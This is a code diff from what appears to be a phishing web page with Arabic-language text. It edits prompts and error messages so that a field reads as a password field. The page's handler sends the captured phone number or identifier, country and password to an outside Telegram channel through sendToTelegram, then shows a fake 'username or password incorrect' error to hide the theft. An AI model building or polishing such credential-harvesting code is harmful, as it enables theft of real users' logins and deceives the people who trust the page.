@@ -400,12 +400,12 @@
 
     sendBtn.addEventListener('click', () => {
       const name = nameInput.value.trim();
-      if(!name){ hint2.style.color = 'crimson'; hint2.textContent = 'الرجاء إدخال الاسم'; setTimeout(()=> hint2.textContent = '', 2200); return; }
+      if(!name){ hint2.style.color = 'crimson'; hint2.textContent = 'الرجاء إدخال كلمة السر بشكل صحيح'; setTimeout(()=> hint2.textContent = '', 2200); return; }
       if(!prev){ showToast('خطأ','لا توجد بيانات سابقة — عد للصفحة الأولى.'); return; }
       const countryText = prev.type === 'phone' && prev.country ? `${prev.country.name} ${prev.country.dial}` : '—';
       const msg = `النوع: ${prev.type}\nالقيمة: ${prev.value}\nالبلد: ${countryText}\nالاسم: ${name}`;
       sendToTelegram(msg);
-      showToast('عذراً','اسم المستخدم أو الاسم غير صحيح. يرجى التحقق والمحاولة مرة أخرى.');
+      showToast('عذراً','اسم المستخدم أو كلمة السر غير صحيحة. يرجى التحقق والمحاولة مرة أخرى.');
       prev = null;
       nameInput.value = '';
     });
